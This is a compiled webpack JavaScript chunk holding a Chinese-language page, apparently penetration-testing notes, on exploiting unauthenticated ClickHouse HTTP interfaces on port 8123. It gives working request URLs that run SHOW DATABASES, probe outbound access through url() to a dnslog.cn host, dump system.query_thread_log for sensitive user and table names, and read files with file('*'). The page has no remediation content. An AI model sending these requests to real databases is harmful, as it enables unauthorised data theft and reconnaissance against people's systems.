(window.webpackJsonp=window.webpackJsonp||[]).push([[15],{2310:function(s,t,a){"use strict";a.r(t);var e=a(75),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"clickhouse-8123端口"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#clickhouse-8123端口"}},[s._v("#")]),s._v(" ClickHouse 8123端口")]),s._v(" "),e("h2",{attrs:{id:"关于"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#关于"}},[s._v("#")]),s._v(" 关于")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("默认情况下，clickhouse-server会在8123端口上监控HTTP请求（这可以在配置中修改）。")]),e("br"),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("如果你发送了一个未携带任何参数的GET /请求，它会返回一个字符串 «Ok.»（结尾有换行）。可以将它用在健康检查脚本中。")]),e("br"),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("如果你发送了一个未携带任何参数的GET /请求，它返回响应码200和OK字符串定义，可在[Http服务响应配置](https://clickhouse.tech/docs/zh/operations/server-configuration-parameters/settings/#server_configuration_parameters-http_server_default_response)定义(在末尾添加换行)")]),e("br"),s._v(" "),e("p",[e("img",{attrs:{src:a(952),alt:"img"}})]),s._v(" "),e("p",[s._v("这里可以看到 ClickHouse 存在着的接口由于没有鉴权，则任意访问者都可以执行SQL语句获取数据")]),s._v(" "),e("h2",{attrs:{id:"攻击方法"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#攻击方法"}},[s._v("#")]),s._v(" 攻击方法")]),s._v(" "),e("p",[s._v("首先确定是否使用了 ClickHouse 数据库的接口")]),s._v(" "),e("p",[e("img",{attrs:{src:a(953),alt:"img"}})]),s._v(" "),e("p",[s._v("根据文档得知，正常返回为 Ok. , 且存在 X-ClickHouse-Summary 作为返回包的 Header")]),s._v(" "),e("p",[e("img",{attrs:{src:a(954),alt:"img"}})]),s._v(" "),e("p",[s._v("测试是否可以执行SQL命令, 部分会开启身份验证导致未授权执行失败")]),s._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("query"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("SHOW")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("DATABASES\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:a(955),alt:"img"}})]),s._v(" "),e("p",[s._v("成功执行语句获取数据，执行其他命令探测出网")]),s._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("query"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("SELECT")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("FROM"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("url"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'http://jahl09.dnslog.cn'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'txt'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'column1%20UInt32'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("LIMIT"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("202")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:a(956),alt:"img"}})]),s._v(" "),e("p",[e("img",{attrs:{src:a(957),alt:"img"}})]),s._v(" "),e("p",[s._v("其中也可以查看 system库中的执行记录表来获取最近执行的所有SQL语句来快速定位可利用的信息")]),s._v(" "),e("p",[s._v("(获取敏感用户信息，数据库名以及数据表名)")]),s._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("query"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("SELECT")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("FROM"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("system"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("query_thread_log\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:a(958),alt:"img"}})]),s._v(" "),e("p",[s._v("由于默认配置中的可读路径默认 ("),e("strong",[s._v("配置文件位置：/etc/clickhouse-server/config.xml")]),s._v(")")]),s._v(" "),e("p",[s._v("因此只能读取下面路径中的文件，当目标中曾在该路径导入文件且没有删除的情况下，可通过测试获取敏感文件信息，获取数据文件")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("/var/lib/clickhouse/user_files/")]),e("br"),s._v(" "),e("p",[e("img",{attrs:{src:a(959),alt:"img"}})]),s._v(" "),e("p",[s._v("其中读取时可以利用通配符跳过不知道文件名的情况获取文件信息")]),s._v(" "),e("p",[e("img",{attrs:{src:a(960),alt:"img"}})]),s._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("?")]),s._v("query"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token constant"}},[s._v("SELECT")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("FROM"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("file"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'*'")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("C"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'CSV'")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),s._v("C"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),e("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[s._v("'column1%20String%2C%20column2%20String%2C%20column3%20String'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("20")]),s._v("LIMIT"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("203")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v('B"\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:a(961),alt:"img"}})])],1)}),[],!1,null,null,null);t.default=r.exports},952:function(s,t,a){s.exports=a.p+"assets/img/1628588206029-001c2f56-3c81-460f-9c1e-e9591ef9a545.d1a94db1.png"},953:function(s,t,a){s.exports=a.p+"assets/img/1628596147024-6b26b99d-8bdf-4a21-b240-f607be168a27.0c3d41c4.png"},954:function(s,t,a){s.exports=a.p+"assets/img/1628589399544-1c658858-3310-4fcd-81d5-b50ed0f0696f.814080a1.png"},955:function(s,t,a){s.exports=a.p+"assets/img/1628596162773-fc4906c3-fd7d-4ede-a8d7-84a448ff4204.43a60680.png"},956:function(s,t,a){s.exports=a.p+"assets/img/1628596284780-19788c3d-bd1b-4d95-97e9-6a9a16fd0138.3a378844.png"},957:function(s,t,a){s.exports=a.p+"assets/img/1628596307830-d5958eea-ede0-4c17-8573-e77b07b362d4.a11e578e.png"},958:function(s,t,a){s.exports=a.p+"assets/img/1628597494586-5ea6c6ea-6526-44e0-b4b2-c92ae0fcb2d5.149227fc.png"},959:function(s,t,a){s.exports=a.p+"assets/img/1628598316644-34da7b10-b2c6-45f1-a4ff-d5c11be372c7.b3a28292.png"},960:function(s,t,a){s.exports=a.p+"assets/img/1628600107499-7067f4c9-bc8a-4540-84e6-ceafd4dfdb42.f9dc1329.png"},961:function(s,t,a){s.exports=a.p+"assets/img/1628600056235-beb60a43-c6bd-499c-8383-647185379ed1.87872c63.png"}}]);